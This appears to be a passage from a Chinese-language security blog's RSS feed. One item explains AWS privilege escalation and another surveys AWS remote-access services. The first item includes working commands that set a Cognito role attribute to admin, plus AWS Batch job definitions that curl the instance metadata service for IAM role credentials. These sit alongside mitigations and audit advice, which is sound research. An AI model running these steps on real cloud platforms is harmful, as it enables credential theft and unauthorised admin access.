&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws cognito-idp get-user --region us-east-1 --access-token &amp;lt;USER_ACCESS_TOKEN&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws --region us-east-1 cognito-idp update-user-attributes --user-attributes &lt;span class=&#34;s2&#34;&gt;&amp;#34;Name=custom:Role,Value=admin&amp;#34;&lt;/span&gt; --access-token &amp;lt;USER_ACCESS_TOKEN&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;漏洞根源在于平台过度信任&lt;code&gt;custom:Role&lt;/code&gt;属性进行授权判断。&lt;/p&gt;
&lt;h3 id=&#34;技术聚焦aws-batch权限提升研究&#34;&gt;技术聚焦：AWS Batch权限提升研究
&lt;/h3&gt;&lt;h4 id=&#34;aws-batch基础架构&#34;&gt;AWS Batch基础架构
&lt;/h4&gt;&lt;p&gt;AWS Batch是AWS提供的批处理计算服务，主要组件包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Jobs&lt;/strong&gt;：工作单元（脚本/可执行文件/容器镜像）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Job definitions&lt;/strong&gt;：任务蓝图（含IAM角色、资源需求等配置）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Job Queues&lt;/strong&gt;：任务调度队列&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Compute environments&lt;/strong&gt;：计算资源环境（支持Fargate/EC2/EKS三种编排类型）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;漏洞场景分析&#34;&gt;漏洞场景分析
&lt;/h4&gt;&lt;p&gt;在多租户平台中发现高危配置：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;所有租户任务均使用EC2编排类型运行&lt;/li&gt;
&lt;li&gt;计算环境EC2实例需要高权限角色管理EFS等资源&lt;/li&gt;
&lt;li&gt;任务容器具有&lt;code&gt;batch:RegisterJobDefinition&lt;/code&gt;和&lt;code&gt;batch:SubmitJob&lt;/code&gt;权限&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;攻击链分解&#34;&gt;攻击链分解
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;初始访问&lt;/strong&gt;：通过容器元数据服务（CMDS@169.254.170.2）获取任务执行角色凭证&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;权限滥用&lt;/strong&gt;：利用获得的凭证创建恶意任务定义&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络配置突破&lt;/strong&gt;：由于EC2环境默认使用主机网络模式，容器可访问实例元数据服务（IMDSv2）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;凭证窃取&lt;/strong&gt;：通过IMDS获取EC2实例的高权限角色凭证&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;技术验证过程&#34;&gt;技术验证过程
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;步骤1 - 获取实例角色名&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws batch register-job-definition &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --job-definition-name poc-get-rolename &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --type container &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --container-properties &lt;span class=&#34;s1&#34;&gt;&amp;#39;{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;image&amp;#34;: &amp;#34;curlimages/curl&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;command&amp;#34;: [&amp;#34;sh&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/&amp;#34;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;  }&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;步骤2 - 获取角色凭证&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws batch register-job-definition &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --job-definition-name poc-get-aimcreds &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --type container &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --container-properties &lt;span class=&#34;s1&#34;&gt;&amp;#39;{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;image&amp;#34;: &amp;#34;curlimages/curl&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;command&amp;#34;: [&amp;#34;sh&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME&amp;#34;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;  }&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;安全建议&#34;&gt;安全建议
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;审计人员检查清单&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;确认任务执行上下文是否限制IMDS访问&lt;/li&gt;
&lt;li&gt;审查EC2编排环境中的实例角色权限&lt;/li&gt;
&lt;li&gt;检查是否过度分配&lt;code&gt;RegisterJobDefinition/SubmitJob&lt;/code&gt;权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;开发者防护措施&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;网络层限制IMDS访问（通过&lt;code&gt;aws ec2 modify-instance-metadata-options&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;遵循最小权限原则配置任务角色&lt;/li&gt;
&lt;li&gt;考虑使用Fargate替代EC2编排类型&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;实践资源&#34;&gt;实践资源
&lt;/h3&gt;&lt;p&gt;漏洞复现环境已开源：&lt;a class=&#34;link&#34; href=&#34;https://github.com/doyensec/cloudsec-tidbits/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CloudSecTidbits实验室&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;延伸阅读&#34;&gt;延伸阅读
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://docs.aws.amazon.com/batch/latest/userguide/what-is-batch.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;AWS Batch官方文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.doyensec.com/2023/03/13/aws-metadata-service-container-security.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;容器工作负载中的元数据服务安全&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>AWS远程访问指南：混合办公环境的安全技术方案</title>
        <link>http://localhost:1313/p/aws%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E6%8C%87%E5%8D%97%E6%B7%B7%E5%90%88%E5%8A%9E%E5%85%AC%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/</link>
        <pubDate>Sat, 02 Aug 2025 22:00:53 +0800</pubDate>
        
        <guid>http://localhost:1313/p/aws%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E6%8C%87%E5%8D%97%E6%B7%B7%E5%90%88%E5%8A%9E%E5%85%AC%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/</guid>
        <description>&lt;h1 id=&#34;aws远程访问指南混合办公环境的安全技术方案&#34;&gt;AWS远程访问指南：混合办公环境的安全技术方案
&lt;/h1&gt;&lt;p&gt;Amazon Web Services（AWS）客户可通过安全远程访问云资源，在保障业务敏捷性的同时满足灵活办公需求。随着混合办公模式普及，AWS提供完整的安全解决方案，帮助企业在允许远程访问的前提下维护资源保护、访问控制及合规要求。&lt;/p&gt;
&lt;h2 id=&#34;关键技术用例&#34;&gt;关键技术用例
&lt;/h2&gt;&lt;p&gt;本文重点解决以下场景：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户访问VPC内部署的Web应用&lt;/li&gt;
&lt;li&gt;运维人员访问VPC内的EC2/RDS实例&lt;/li&gt;
&lt;li&gt;分析师访问Amazon S3敏感数据&lt;/li&gt;
&lt;li&gt;用户访问SAML 2.0/OAuth 2.0应用&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;远程访问核心挑战&#34;&gt;远程访问核心挑战
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;成本控制&lt;/strong&gt;：解决方案的经济性评估&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;暴露面扩大&lt;/strong&gt;：需保护身份、设备及通信链路&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;社会工程风险&lt;/strong&gt;：人为因素成为安全薄弱环节&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用户体验&lt;/strong&gt;：不良UX设计可能引发操作风险&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;五大技术方案详解&#34;&gt;五大技术方案详解
&lt;/h2&gt;&lt;h3 id=&#34;1-网络层方案network-based&#34;&gt;1. 网络层方案（Network-based）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;核心服务&lt;/strong&gt;：AWS Client VPN&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于OpenVPN客户端实现VPC安全接入&lt;/li&gt;
&lt;li&gt;支持企业IDP联合证书双重认证&lt;/li&gt;
&lt;li&gt;通过CIDR授权规则实现网络级访问控制&lt;/li&gt;
&lt;li&gt;典型架构：用户设备 → Client VPN → VPC端点 → 目标资源&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-主机层方案host-based&#34;&gt;2. 主机层方案（Host-based）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;关键技术对比&lt;/strong&gt;：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;服务&lt;/th&gt;
          &lt;th&gt;协议&lt;/th&gt;
          &lt;th&gt;认证方式&lt;/th&gt;
          &lt;th&gt;可见性&lt;/th&gt;
          &lt;th&gt;成本模型&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Systems Manager&lt;/td&gt;
          &lt;td&gt;SSH/RDP&lt;/td&gt;
          &lt;td&gt;IAM策略&lt;/td&gt;
          &lt;td&gt;CloudTrail全日志&lt;/td&gt;
          &lt;td&gt;免费（EC2场景）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;EC2 Instance Connect&lt;/td&gt;
          &lt;td&gt;原生SSH&lt;/td&gt;
          &lt;td&gt;短期密钥&lt;/td&gt;
          &lt;td&gt;连接级审计&lt;/td&gt;
          &lt;td&gt;无附加费用&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;3-终端用户计算euc&#34;&gt;3. 终端用户计算（EUC）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;服务选型&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Amazon WorkSpaces&lt;/strong&gt;：持久化云桌面（WSP/PCoIP协议）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AppStream 2.0&lt;/strong&gt;：按需应用流式传输（NICE DCV协议）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全优势&lt;/strong&gt;：数据永不离开VPC，仅传输加密像素流&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-应用层方案application-based&#34;&gt;4. 应用层方案（Application-based）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;IAM Identity Center核心能力&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;统一管理SAML 2.0/OAuth 2.0应用访问&lt;/li&gt;
&lt;li&gt;内置支持Amazon QuickSight等AWS托管应用&lt;/li&gt;
&lt;li&gt;与企业AD/SAML IDP无缝集成&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-零信任模型&#34;&gt;5. 零信任模型
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;AWS Verified Access关键技术&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于Cedar策略的细粒度授权&lt;/li&gt;
&lt;li&gt;集成设备信号增强决策上下文&lt;/li&gt;
&lt;li&gt;每个请求的完整日志记录（HTTP/TCP层）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术选型决策矩阵&#34;&gt;技术选型决策矩阵
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;解决方案&lt;/th&gt;
          &lt;th&gt;信任边界&lt;/th&gt;
          &lt;th&gt;协议支持&lt;/th&gt;
          &lt;th&gt;授权粒度&lt;/th&gt;
          &lt;th&gt;成本因素&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Client VPN&lt;/td&gt;
          &lt;td&gt;网络子网&lt;/td&gt;
          &lt;td&gt;IP层&lt;/td&gt;
          &lt;td&gt;CIDR块级&lt;/td&gt;
          &lt;td&gt;连接时长×终端数&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Verified Access&lt;/td&gt;
          &lt;td&gt;应用实例&lt;/td&gt;
          &lt;td&gt;HTTP(S)/TCP&lt;/td&gt;
          &lt;td&gt;属性基策略&lt;/td&gt;
          &lt;td&gt;应用数×带宽消耗&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;WorkSpaces&lt;/td&gt;
          &lt;td&gt;虚拟桌面&lt;/td&gt;
          &lt;td&gt;WSP&lt;/td&gt;
          &lt;td&gt;组成员关系&lt;/td&gt;
          &lt;td&gt;实例类型×运行时长&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;实施建议&#34;&gt;实施建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;资产分类&lt;/strong&gt;：明确需访问的资源关键等级&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可见性设计&lt;/strong&gt;：确保满足合规审计要求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;混合部署&lt;/strong&gt;：不同场景组合使用多方案（如内部员工用Session Manager，外包人员用AppStream 2.0）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;参考架构&lt;/strong&gt;：遵循&lt;a class=&#34;link&#34; href=&#34;https://docs.aws.amazon.com/prescriptive-guidance/latest/security-reference-architecture/welcome.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;AWS安全参考架构&lt;/a&gt;设计部署模型&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        
    </channel>
</rss>
